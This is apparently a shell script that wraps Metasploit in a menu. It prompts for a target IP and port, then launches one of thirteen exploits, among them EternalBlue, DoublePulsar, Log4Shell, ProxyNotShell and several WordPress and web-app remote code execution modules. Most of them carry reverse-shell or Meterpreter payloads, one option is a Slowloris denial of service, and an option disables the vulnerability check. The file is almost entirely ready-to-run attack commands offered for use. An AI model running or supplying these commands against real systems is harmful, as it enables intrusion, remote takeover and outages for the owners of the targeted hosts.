#!/bin/sh
#MSFEXPLOITINGPROJECT
#By-vDroPZz
#

#COLORED_OUTPUT

blue='\033[94m'
red='\033[91m'
green='\033[92m'
orange='\033[93m'
reset='\e[0m'
magenta='\u001b[35m'
yellow='\u001b[33m'

clear 
sleep 0.5 
    echo $blue
    figlet -f small "Coded by:"
    echo $reset
sleep 0.5 
    echo $orange
    figlet -f big "vDroPZz"
    echo $reset
sleep 1.0 
clear 
    echo $blue
    figlet -f small "Github:"
    echo $reset
sleep 1.0 
    echo $orange
    figlet -f big "DroPZsec"
    echo $reset
sleep 1.5 
clear 
echo $green "Enter Target IP-Address:" $reset
    read ip;
clear
echo $green "loading Exploit Menu..." $reset
    sleep 1.5
echo $green "." $reset
    sleep 1.0
echo $green "." $reset
    sleep 1.0 
echo $green "." $reset
    sleep 1.0
clear 
echo $red "Target: $ip" $reset
echo
echo
echo
echo $orange "1.)"$reset $blue"Apache Couchdb Erlang RCE" $reset
    sleep 0.25
echo $orange "2.)"$reset $blue"Apache Spark Unauthenticated Command Injection RCE" $reset
    sleep 0.25
echo $orange "3.)"$reset $blue"Microsoft Exchange ProxyNotShell RCE" $reset
    sleep 0.25
echo $orange "4.)"$reset $blue"Remote Mouse RCE" $reset
    sleep 0.25
echo $orange "5.)"$reset $blue"Roxy-WI Prior to 6.1.1.0 Unauthenticated Command Injection RCE" $reset
    sleep 0.25
echo $orange "6.)"$reset $blue"Wifi Mouse RCE" $reset
    sleep 0.25
echo $orange "7.)"$reset $blue"Wordpress Plugin Elementor Authenticated Upload Remote Code Execution" $reset
    sleep 0.25
echo $orange "8.)"$reset $blue"Slowloris Denial of Service Attack" $reset
    sleep 0.25
echo $orange "9.)"$reset $blue"SMB DOUBLEPULSAR Remote Code Execution" $reset
    sleep 0.25
echo $orange "10.)"$reset $blue"PhpMyAdmin Config File Code Injection" $reset
    sleep 0.25
echo $orange "11.)"$reset $blue"MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption" $reset
    sleep 0.25
echo $orange "12.)"$reset $blue"Log4Shell HTTP Header Injection" $reset
    sleep 0.25
echo $orange "13.)"$reset $blue"WordPress Database Backup RCE" $reset
    sleep 0.25
echo
echo $green "Choose a number:" $reset && read answer;
if [ $answer = 1 ]; then
    echo $green "Target Port:" $reset
        read port;
    echo $green "check if the exploit can be used$reset $blue(s)$reset$green or exploiting directly $red(e)$reset$green ?" $reset
        read ea;
    if [ $ea = s ]; then
        msfconsole -q -x " use exploit/multi/http/apache_couchdb_erlang_rce; set payload cmd/unix/reverse_openssl; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
    if [ $ea = e ]; then
        msfconsole -q -x " use exploit/multi/http/apache_couchdb_erlang_rce; set payload cmd/unix/reverse_openssl; set AutoCheck false; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
fi
if [ $answer = 2 ]; then
    echo $green "Target Port:" $reset
        read port;
    echo $green "check if the exploit can be used$reset $blue(s)$reset$green or exploiting directly $red(e)$reset$green ?" $reset
    read ea;
    if [ $ea = e ]; then
        msfconsole -q -x " use exploit/linux/http/apache_spark_rce_cve_2022_33891; set payload cmd/unix/reverse_python; set AutoCheck false; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
    if [ $ea = s ]; then
        msfconsole -q -x " use exploit/linux/http/apache_spark_rce_cve_2022_33891; set payload cmd/unix/reverse_python; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
fi
if [ $answer = 3 ]; then
    echo $green "Target Port:" $reset
        read port;
    echo $green "check if the exploit can be used$reset $blue(s)$reset$green or exploiting directly $red(e)$reset$green ?" $reset
        read ea;
    if [ $ea = s ]; then
        msfconsole -q -x " use exploit/windows/http/exchange_proxynotshell_rce; set payload windows/meterpreter/reverse_tcp; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
    if [ $ea = e ]; then
        msfconsole -q -x " use exploit/windows/http/exchange_proxynotshell_rce; set payload windows/meterpreter/reverse_tcp; set AutoCheck false; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
fi
if [ $answer = 4 ]; then
    echo $green "Target Port:" $reset
        read port;
    echo $green "check if the exploit can be used$reset $blue(s)$reset$green or exploiting directly $red(e)$reset$green ?" $reset
        read ea;
    if [ $ea = s ]; then
        msfconsole -q -x " use exploit/windows/misc/remote_mouse_rce; set payload windows/shell/reverse_tcp; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
    if [ $ea = e ]; then
        msfconsole -q -x " use exploit/windows/misc/remote_mouse_rce; set payload windows/shell/reverse_tcp; set AutoCheck false; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
fi
if [ $answer = 5 ]; then
    echo $green "Target Port:" $reset
        read port;
    echo $green "check if the exploit can be used$reset $blue(s)$reset$green or exploiting directly $red(e)$reset$green ?" $reset
        read ea;
    if [ $ea = s ]; then
        msfconsole -q -x " use exploit/linux/http/roxy_wi_exec; set payload cmd/unix/python/meterpreter/reverse_tcp; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
    if [ $ea = e ]; then
        msfconsole -q -x " use exploit/linux/http/roxy_wi_exec; set payload cmd/unix/python/meterpreter/reverse_tcp; set AutoCheck false; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
fi
if [ $answer = 6 ]; then
    echo $greeen "Target Port:" $reset
        read port;
    echo $green "check if the exploit can be used$reset $blue(s)$reset$green or exploiting directly $red(e)$reset$green ?" $reset
        read ea;
    if [ $ea = s ]; then
        msfconsole -q -x " use exploit/windows/misc/wifi_mouse_rce; set payload windows/shell/reverse_tcp; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
    if [ $ea = e ]; then
        msfconsole -q -x " use exploit/windows/misc/wifi_mouse_rce; set payload windows/shell/reverse_tcp; set AutoCheck false; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
fi
if [ $answer = 7 ]; then
    echo $green "Target Port:" $reset
        read port;
    echo $green "check if the exploit can be used$reset $blue(s)$reset$green or exploiting directly $red(e)$reset$green ?" $reset
        read ea;
    if [ $ea = s ]; then
        msfconsole -q -x " use exploit/multi/http/wp_plugin_elementor_auth_upload_rce; set payload php/meterpreter/reverse_tcp; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
    if [ $ea = e ]; then
        msfconsole -q -x " use exploit/multi/http/wp_plugin_elementor_auth_upload_rce; set payload php/meterpreter/reverse_tcp; set AutoCheck false; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
fi
if [ $answer = 8 ]; then
    echo $green "Target Port:" $reset 
        read port;
    msfconsole -q -x " use auxiliary/dos/http/slowloris; set rhost $ip; set rport $port; exploit; exit; "    
fi
if [ $answer = 9 ]; then
    echo $green "Target Port:" $reset 
        read port;
    echo $green "check if the exploit can be used$reset $blue(s)$reset$green or exploiting directly $red(e)$reset$green ?" $reset
        read ea;
    if [ $ea = s ]; then
        msfconsole -q -x " use exploit/windows/smb/smb_doublepulsar_rce; set payload windows/x64/meterpreter/reverse_tcp; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
    if [ $ea = e ]; then
        msfconsole -q -x " use exploit/windows/smb/smb_doublepulsar_rce; set payload windows/x64/meterpreter/reverse_tcp; set AutoCheck false; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
fi
if [ $answer = 10 ]; then
    echo $green "Target Port:" $reset
        read port;
    echo $green "check if the exploit can be used$reset $blue(s)$reset$green or exploiting directly $red(e)$reset$green ?" $reset
        read ea;
    if [ $ea = s ]; then
        msfconsole -q -x " use exploit/unix/webapp/phpmyadmin_config; set payload php/meterpreter/reverse_tcp; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
    if [ $ea = e ]; then 
        msfconsole -q -x " use exploit/unix/webapp/phpmyadmin_config; set payload php/meterpreter/reverse_tcp; set AutoCheck false; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
fi
if [ $answer = 11 ]; then
    echo $green "Target Port:" $reset
        read port;
    echo $green "check if the exploit can be used$reset $blue(s)$reset$green or exploiting directly $red(e)$reset$green ?" $reset
        read ea;
    if [ $ea = s ]; then
        msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
    if [ $ea = e ]; then
        msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp; set AutoCheck false; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
fi
if [ $answer = 12 ]; then
    echo $green "Target Port:" $reset
        read port;
    echo $green "check if the exploit can be used$reset $blue(s)$reset$green or exploiting directly $red(e)$reset$green ?" $reset
        read ea;
    if [ $ea = s ]; then
        msfconsole -q -x " use exploit/multi/http/log4shell_header_injection; set payload java/shell_reverse_tcp; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
    if [ $ea = e ]; then
        msfconsole -q -x " use exploit/multi/http/log4shell_header_injection; set payload java/shell_reverse_tcp; set AutoCheck false; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
fi
if [ $answer = 13 ]; then
    echo $green "Target Port:" $reset
        read port;
    echo $green "check if the exploit can be used$reset $blue(s)$reset$green or exploiting directly $red(e)$reset$green ?" $reset
        read ea;
    if [ $ea = s ]; then
        msfconsole -q -x " use exploit/multi/http/wp_db_backup_rce; set payload windows/meterpreter/reverse_tcp; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
    if [ $ea = e ]; then
        msfconsole -q -x " use exploit/multi/http/wp_db_backup_rce; set payload windows/meterpreter/reverse_tcp; set AutoCheck false; set lhost eth0; set rhosts $ip; set rport $port; exploit; exit; "
    fi
fi
exit
/bin/sh